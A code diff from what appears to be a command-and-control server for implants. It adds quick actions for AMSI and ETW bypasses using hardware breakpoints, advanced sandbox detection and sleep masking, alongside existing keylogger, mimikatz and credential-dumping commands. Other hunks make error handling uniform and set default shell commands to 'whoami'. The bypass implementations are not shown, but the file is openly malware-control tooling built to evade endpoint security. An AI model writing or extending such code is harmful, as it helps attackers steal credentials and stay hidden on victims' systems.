@@ -57,7 +57,7 @@ func (s *Server) handleToolkitQuickAction(c *gin.Context) {
 	}
 
 	if err := s.db.Create(&task).Error; err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
+		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
 
@@ -125,12 +125,12 @@ func buildQuickActionCommand(action, param, shell string) (string, string) {
 		if param != "" {
 			return "powerpick", param
 		}
-		return "shell", fmt.Sprintf("powershell -Enc %s", param)
+		return "shell", "whoami"
 	case "shell":
 		if param != "" {
 			return "shell", param
 		}
-		return "shell", param
+		return "shell", "whoami"
 	case "keylogger_start":
 		return "keylogger_start", ""
 	case "keylogger_stop":
@@ -149,6 +149,14 @@ func buildQuickActionCommand(action, param, shell string) (string, string) {
 		return "amsi_bypass", ""
 	case "etw_bypass":
 		return "etw_bypass", ""
+	case "amsi_hardware_bp":
+		return "amsi_hardware_bp", ""
+	case "etw_hardware_bp":
+		return "etw_hardware_bp", ""
+	case "sandbox_detect_advanced":
+		return "sandbox_detect_advanced", ""
+	case "set_sleep_mask_advanced":
+		return "set_sleep_mask_advanced", ""
 	case "mimikatz":
 		return "mimikatz", ""
 	case "creds":
@@ -185,7 +193,7 @@ func (s *Server) handleToolkitAgentInfo(c *gin.Context) {
 
 	var agent db.Implant
 	if err := s.db.Where("id = ?", agentID).First(&agent).Error; err != nil {
-		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
+		respondError(c, http.StatusNotFound, "agent not found")
 		return
 	}
 
